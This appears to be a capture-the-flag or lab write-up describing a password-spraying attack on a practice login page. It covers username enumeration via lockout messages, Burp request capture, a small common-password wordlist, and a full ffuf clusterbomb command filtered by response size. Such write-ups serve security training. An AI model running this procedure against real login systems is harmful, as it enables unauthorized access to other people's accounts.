We are given a website with an account warning of lock out after 5 failed in-corrects attempts

![](https://i.imgur.com/uPqXeEK.png)

Definitely when it comes to situation like this what should come to mind is **password spraying**, we can enumerate usernames through the page description and our own instinct


![](https://i.imgur.com/Wo6lxO1.png)


I managed to find **admin, jeremy and jessamy** because this are the only login attempts that throws a lockout attempt warning


we can then try out a **password spraying** attack using `ffuf`

- Open up `burpsuite` and intercept the request
- copy or save the request to a `TXT` file
- Then replace username field with `FUZZUSER` and password with `FUZZPASS`

![](https://i.imgur.com/t05GYFj.jpg)

- We can create a wordlist of usernames we found and then 5 common passwords we know, since we get a lockout after 5 attempts

```
# common password wordlist

Password
admin
letmein
Password123
qwerty

# Username found wordlist

admin
jeremy
jessamy
```

- Now we can fire up `ffuf` and start our password spraying attack

```bash
# -request : request file to check
# -request-proto : protocol to use along with raw request (default: https)
# -mode : Multi-wordlist operation mode, run --help for more
# -w : specify wordlist
# -fs : filter by size

$ ffuf -request teashop.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w users.txt:FUZZUSER -fs 3376
```

**Note :** You can intercept request with **burpsuite>>send to repeater>>forward request** and then try to check for the size of the response to determine the `-fs` switch in `ffuf` by checking the **Content-Length** of your response

![](https://i.imgur.com/6A30C2d.png)


- Run your script and check the **Size** output to determine which is a valid login

![](https://i.imgur.com/LTIEL7r.png)


- `1209` - "Password incorrect, added a lockout attempt"
- `1211` - "Successfully logged in! Challenge complete!"
- `1202` - "No Errors"

